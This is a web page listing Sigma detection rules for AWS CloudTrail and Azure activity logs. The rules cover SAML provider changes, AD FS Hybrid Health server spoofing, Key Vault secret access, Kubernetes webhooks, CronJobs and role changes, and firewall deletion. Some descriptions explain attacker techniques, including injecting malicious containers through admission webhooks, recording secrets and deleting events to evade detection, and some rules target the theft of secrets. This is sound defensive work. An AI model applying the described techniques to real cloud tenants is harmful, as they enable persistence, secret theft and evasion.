<li><a href="#">title:AWS Suspicious SAML Activity id: f43f5d2f-3f2a-4cc8-b1af-81fde7dbaf0e description: Identifies when suspicious SAML activity has occurred in AWS. An adversary could gain backdoor access via SAML. author: Austin Songer status: experimental date: 2021/09/22 references: - - logsource: product: aws service: cloudtrail detection: selection1: eventSource: sts.amazonaws.com eventName: AssumeRoleWithSAML selection2: eventSource: iam.amazonaws.com eventName: UpdateSAMLProvider condition: selection1 or selection2 level: medium tags: - attack.initial_access - attack.t1078 - attack.lateral_movement - attack.t1548 - attack.privilege_escalation - attack.t1550 - attack.t1550.001 falsepositives: - Automated processes that uses Terraform may lead to false positives. - SAML Provider could be updated by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - SAML Provider being updated from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS User Login Profile Was Modified id: 055fb148-60f8-462d-ad16-26926ce050f1 status: experimental description: | An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup. With this alert, it is used to detect anyone is changing password on behalf of other users. author: toffeebr33k date: 2021/08/09 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: iam.amazonaws.com eventName: UpdateLoginProfile filter: userIdentity.arn|contains: requestParameters.userName condition: selection_source and not filter fields: - userIdentity.arn - requestParameters.userName - errorCode - errorMessage falsepositives: - Legit User Account Administration level: high tags: - attack.persistence - attack.t1098 
<li><a href="#">title:Azure Active Directory Hybrid Health AD FS New Server id: 288a39fc-4914-4831-9ada-270e9dc12cb4 description: | This detection uses azureactivity logs (Administrative category) to identify the creation or update of a server instance in an Azure AD Hybrid health AD FS service. A threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-prem AD FS server. This can be done programmatically via HTTP requests to Azure. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.defense_evasion - attack.t1578 references: - logsource: product: azure service: azureactivity detection: selection: CategoryValue: 'Administrative' ResourceProviderValue: 'Microsoft.ADHybridHealthService' ResourceId|contains: 'AdFederationService' OperationNameValue: 'Microsoft.ADHybridHealthService/services/servicemembers/action' condition: selection falsepositives: - Legitimate AD FS servers added to an AAD Health AD FS service instance level: medium 
<li><a href="#">title:Azure Active Directory Hybrid Health AD FS Service Delete id: 48739819-8230-4ee3-a8ea-e0289d1fb0ff description: | This detection uses azureactivity logs (Administrative category) to identify the deletion of an Azure AD Hybrid health AD FS service instance in a tenant. A threat actor can create a new AD Health ADFS service and create a fake server to spoof AD FS signing logs. The health AD FS service can then be deleted after it is not longer needed via HTTP requests to Azure. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.defense_evasion - attack.t1578.003 references: - logsource: product: azure service: azureactivity detection: selection: CategoryValue: 'Administrative' ResourceProviderValue: 'Microsoft.ADHybridHealthService' ResourceId|contains: 'AdFederationService' OperationNameValue: 'Microsoft.ADHybridHealthService/services/delete' condition: selection falsepositives: - Legitimate AAD Health AD FS service instances being deleted in a tenant level: medium 
<li><a href="#">title:Azure AD Health Monitoring Agent Registry Keys Access id: ff151c33-45fa-475d-af4f-c2f93571f4fe description: | This detection uses Windows security events to detect suspicious access attempts to the registry key of Azure AD Health monitoring agent. This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object HKLM\SOFTWARE\Microsoft\Microsoft Online\Reporting\MonitoringAgent. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.discovery - attack.t1012 references: - - logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: 'Key' ObjectName: '\REGISTRY\MACHINE\SOFTWARE\Microsoft\Microsoft Online\Reporting\MonitoringAgent' filter: ProcessName|contains: - 'Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe' - 'Microsoft.Identity.Health.Adfs.InsightsService.exe' - 'Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe' - 'Microsoft.Identity.Health.Adfs.PshSurrogate.exe' - 'Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe' condition: selection and not filter falsepositives: - Unknown level: medium 
<li><a href="#">title:Azure AD Health Service Agents Registry Keys Access id: 1d2ab8ac-1a01-423b-9c39-001510eae8e8 description: | This detection uses Windows security events to detect suspicious access attempts to the registry key values and sub-keys of Azure AD Health service agents (e.g AD FS). Information from AD Health service agents can be used to potentially abuse some of the features provided by those services in the cloud (e.g. Federation). This detection requires an access control entry (ACE) on the system access control list (SACL) of the following securable object: HKLM:\SOFTWARE\Microsoft\ADHealthAgent. Make sure you set the SACL to propagate to its sub-keys. status: experimental date: 2021/08/26 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.discovery - attack.t1012 references: - - logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 ObjectType: 'Key' ObjectName: '\REGISTRY\MACHINE\SOFTWARE\Microsoft\ADHealthAgent' filter: ProcessName|contains: - 'Microsoft.Identity.Health.Adfs.DiagnosticsAgent.exe' - 'Microsoft.Identity.Health.Adfs.InsightsService.exe' - 'Microsoft.Identity.Health.Adfs.MonitoringAgent.Startup.exe' - 'Microsoft.Identity.Health.Adfs.PshSurrogate.exe' - 'Microsoft.Identity.Health.Common.Clients.ResourceMonitor.exe' condition: selection and not filter falsepositives: - Unknown level: medium 
<li><a href="#">title:Azure Application Credential Modified id: cdeef967-f9a1-4375-90ee-6978c5f23974 description: Identifies when a application credential is modified. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: 'Update application - Certificates and secrets management' condition: selection level: medium tags: - attack.impact falsepositives: - Application credential added may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application credential added from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Application Deleted id: 410d2a41-1e6d-452f-85e5-abdd8257a823 description: Identifies when a application is deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - Delete application - Hard Delete application condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Application being deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Application Gateway Modified or Deleted id: ad87d14e-7599-4633-ba81-aeb60cfe8cd6 description: Identifies when a application gateway is modified or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/APPLICATIONGATEWAYS/WRITE - MICROSOFT.NETWORK/APPLICATIONGATEWAYS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Application gateway being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application gateway modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Application Security Group Modified or Deleted id: 835747f1-9329-40b5-9cc3-97d465754ce6 description: Identifies when a application security group is modified or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/WRITE - MICROSOFT.NETWORK/APPLICATIONSECURITYGROUPS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Application security group being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application security group modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Container Registry Created or Deleted id: 93e0ef48-37c8-49ed-a02c-038aab23628e description: Detects when a Container Registry is created or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.CONTAINERREGISTRY/REGISTRIES/WRITE - MICROSOFT.CONTAINERREGISTRY/REGISTRIES/DELETE condition: selection level: low tags: - attack.impact falsepositives: - Container Registry being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Container Registry created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Device No Longer Managed or Compliant id: 542b9912-c01f-4e3f-89a8-014c48cdca7d description: Identifies when a device in azure is no longer managed or compliant author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - Device no longer compliant - Device no longer managed condition: selection level: medium tags: - attack.impact falsepositives: - Administrator may have forgotten to review the device. 
<li><a href="#">title:Azure Device or Configuration Modified or Deleted id: 46530378-f9db-4af9-a9e5-889c177d3881 description: Identifies when a device or device configuration in azure is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - Delete device - Delete device configuration - Update device - Update device configuration condition: selection level: medium tags: - attack.impact falsepositives: - Device or device configuration being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Device or device configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure DNS Zone Modified or Deleted id: af6925b0-8826-47f1-9324-337507a0babd description: Identifies when DNS zone is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message|startswith: MICROSOFT.NETWORK/DNSZONES properties.message|endswith: - /WRITE - /DELETE condition: selection level: medium tags: - attack.impact falsepositives: - DNS zone modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - DNS zone modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Domain Federation Settings Modified id: 352a54e1-74ba-4929-9d47-8193d67aba1e description: Identifies when an user or application modified the federation settings on the domain. author: Austin Songer status: experimental date: 2021/09/06 modified: 2022/06/08 references: - - logsource: product: azure service: auditlogs detection: selection: ActivityDisplayName: Set federation settings on domain condition: selection level: medium tags: - attack.initial_access - attack.t1078 falsepositives: - Federation Settings being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Federation Settings modified from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Firewall Modified or Deleted id: 512cf937-ea9b-4332-939c-4c2c94baadcd description: Identifies when a firewall is created, modified, or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/AZUREFIREWALLS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Firewall Rule Collection Modified or Deleted id: 025c9fe7-db72-49f9-af0d-31341dd7dd57 description: Identifies when Rule Collections (Application, NAT, and Network) is being modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/AZUREFIREWALLS/APPLICATIONRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/APPLICATIONRULECOLLECTIONS/DELETE - MICROSOFT.NETWORK/AZUREFIREWALLS/NATRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/NATRULECOLLECTIONS/DELETE - MICROSOFT.NETWORK/AZUREFIREWALLS/NETWORKRULECOLLECTIONS/WRITE - MICROSOFT.NETWORK/AZUREFIREWALLS/NETWORKRULECOLLECTIONS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Rule Collections (Application, NAT, and Network) being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Rule Collections (Application, NAT, and Network) modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Firewall Rule Configuration Modified or Deleted id: 2a7d64cf-81fa-4daf-ab1b-ab80b789c067 description: Identifies when a Firewall Rule Configuration is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULECOLLECTIONGROUPS/DELETE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/RULEGROUPS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall Rule Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall Rule Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Key Vault Modified or Deleted id: 459a2970-bb84-4e6a-a32e-ff0fbd99448d description: Identifies when a key vault is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/WRITE - MICROSOFT.KEYVAULT/VAULTS/DELETE - MICROSOFT.KEYVAULT/VAULTS/DEPLOY/ACTION - MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Key Vault being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Key Vault modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Keyvault Key Modified or Deleted id: 80eeab92-0979-4152-942d-96749e11df40 description: Identifies when a Keyvault Key is modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/KEYS/UPDATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE - MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/IMPORT/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/RECOVER/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/RESTORE/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/DELETE - MICROSOFT.KEYVAULT/VAULTS/KEYS/BACKUP/ACTION - MICROSOFT.KEYVAULT/VAULTS/KEYS/PURGE/ACTION condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Key being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Key modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Keyvault Secrets Modified or Deleted id: b831353c-1971-477b-abb6-2828edc3bca1 description: Identifies when secrets are modified or deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/08/16 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KEYVAULT/VAULTS/SECRETS/WRITE - MICROSOFT.KEYVAULT/VAULTS/SECRETS/DELETE - MICROSOFT.KEYVAULT/VAULTS/SECRETS/BACKUP/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/PURGE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/UPDATE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RECOVER/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/RESTORE/ACTION - MICROSOFT.KEYVAULT/VAULTS/SECRETS/SETSECRET/ACTION condition: selection level: medium tags: - attack.impact - attack.credential_access - attack.t1552 - attack.t1552.001 falsepositives: - Secrets being modified or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Secrets modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Admission Controller id: a61a3c56-4ce2-4351-a079-88ae4cbd2b58 description: Identifies when an admission controller is executed in Azure Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information. author: Austin Songer @austinsonger status: experimental date: 2021/11/25 modified: 2021/11/26 references: - logsource: product: azure service: activitylogs detection: selection1: properties.message|startswith: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/ADMISSIONREGISTRATION.K8S.IO properties.message|endswith: - /MUTATINGWEBHOOKCONFIGURATIONS/WRITE - /VALIDATINGWEBHOOKCONFIGURATIONS/WRITE selection2: properties.message|startswith: MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/ADMISSIONREGISTRATION.K8S.IO properties.message|endswith: - /MUTATINGWEBHOOKCONFIGURATIONS/WRITE - /VALIDATINGWEBHOOKCONFIGURATIONS/WRITE condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.t1078 - attack.credential_access - attack.t1552 - attack.t1552.007 falsepositives: - Azure Kubernetes Admissions Controller may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Cluster Created or Deleted id: 9541f321-7cba-4b43-80fc-fbd1fb922808 description: Detects when a Azure Kubernetes Cluster is created or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/DELETE condition: selection level: low tags: - attack.impact falsepositives: - Kubernetes cluster being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Kubernetes cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes CronJob id: 1c71e254-6655-42c1-b2d6-5e4718d7fc0a description: Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster. author: Austin Songer @austinsonger status: experimental date: 2021/11/22 references: - - - - logsource: product: azure service: activitylogs detection: selection1: properties.message|startswith: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH properties.message|endswith: - /CRONJOBS/WRITE - /JOBS/WRITE selection2: properties.message|startswith: MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH properties.message|endswith: - /CRONJOBS/WRITE - /JOBS/WRITE condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.privilege_escalation - attack.execution falsepositives: - Azure Kubernetes CronJob/Job may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Events Deleted id: 225d8b09-e714-479c-a0e4-55e6f29adf35 description: Detects when Events are deleted in Azure Kubernetes. An adversary may delete events in Azure Kubernetes in an attempt to evade detection. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - - logsource: product: azure service: activitylogs detection: selection_operation_name: properties.message: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EVENTS.K8S.IO/EVENTS/DELETE condition: selection_operation_name level: medium tags: - attack.defense_evasion - attack.t1562 - attack.t1562.001 falsepositives: - Event deletions may be done by a system or network administrator. Verify whether the username, hostname, and/or resource name should be making changes in your environment. Events deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Network Policy Change id: 08d6ac24-c927-4469-b3b7-2e422d6e3c43 description: Identifies when a Azure Kubernetes network policy is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EXTENSIONS/NETWORKPOLICIES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/EXTENSIONS/NETWORKPOLICIES/DELETE condition: selection level: medium tags: - attack.impact - attack.credential_access falsepositives: - Network Policy being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Network Policy being modified and deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Pods Deleted id: b02f9591-12c3-4965-986a-88028629b2e1 description: Identifies the deletion of Azure Kubernetes Pods. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - - logsource: product: azure service: activitylogs detection: selection_operation_name: properties.message: MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/PODS/DELETE condition: selection_operation_name level: medium tags: - attack.impact falsepositives: - Pods may be deleted by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Pods deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes RoleBinding/ClusterRoleBinding Modified and Deleted id: 25cb259b-bbdc-4b87-98b7-90d7c72f8743 description: Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLEBINDINGS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLEBINDINGS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLEBINDINGS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLEBINDINGS/DELETE condition: selection level: medium tags: - attack.impact - attack.credential_access falsepositives: - RoleBinding/ClusterRoleBinding being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - RoleBinding/ClusterRoleBinding modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Secret or Config Object Access id: 7ee0b4aa-d8d4-4088-b661-20efdf41a04c description: Identifies when a Kubernetes account access a sensitive objects such as configmaps or secrets. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/CONFIGMAPS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/CONFIGMAPS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SECRETS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SECRETS/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Sensitive objects may be accessed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Sensitive objects accessed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Sensitive Role Access id: 818fee0c-e0ec-4e45-824e-83e4817b0887 description: Identifies when ClusterRoles/Roles are being modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/BIND/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/ROLES/ESCALATE/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/BIND/ACTION - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/RBAC.AUTHORIZATION.K8S.IO/CLUSTERROLES/ESCALATE/ACTION condition: selection level: medium tags: - attack.impact falsepositives: - ClusterRoles/Roles being modified and deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - ClusterRoles/Roles modification from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Kubernetes Service Account Modified or Deleted id: 12d027c3-b48c-4d9d-8bb6-a732200034b2 description: Identifies when a service account is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - - - - - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/WRITE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/DELETE - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/SERVICEACCOUNTS/IMPERSONATE/ACTION condition: selection level: medium tags: - attack.impact falsepositives: - Service account being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Service account modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Network Firewall Policy Modified or Deleted id: 83c17918-746e-4bd9-920b-8e098bf88c23 description: Identifies when a Firewall Policy is Modified or Deleted. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/FIREWALLPOLICIES/WRITE - MICROSOFT.NETWORK/FIREWALLPOLICIES/JOIN/ACTION - MICROSOFT.NETWORK/FIREWALLPOLICIES/CERTIFICATES/ACTION - MICROSOFT.NETWORK/FIREWALLPOLICIES/DELETE condition: selection level: medium tags: - attack.impact falsepositives: - Firewall Policy being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Firewall Policy modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure Network Security Configuration Modified or Deleted id: d22b4df4-5a67-4859-a578-8c9a0b5af9df description: Identifies when a network security configuration is modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/08 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/WRITE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/DELETE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/JOIN/ACTION - MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/PROVIDERS/MICROSOFT.INSIGHTS/DIAGNOSTICSETTINGS/WRITE condition: selection level: medium tags: - attack.impact falsepositives: - Network Security Configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Network Security Configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:Azure New CloudShell Created id: 72af37e2-ec32-47dc-992b-bc288a2708cb description: Identifies when a new cloudshell is created inside of Azure portal. author: Austin Songer status: experimental date: 2021/09/21 references: - logsource: product: azure service: activitylogs detection: selection: properties.message: MICROSOFT.PORTAL/CONSOLES/WRITE condition: selection level: medium tags: - attack.execution - attack.t1059 falsepositives: - A new cloudshell may be created by a system administrator. 
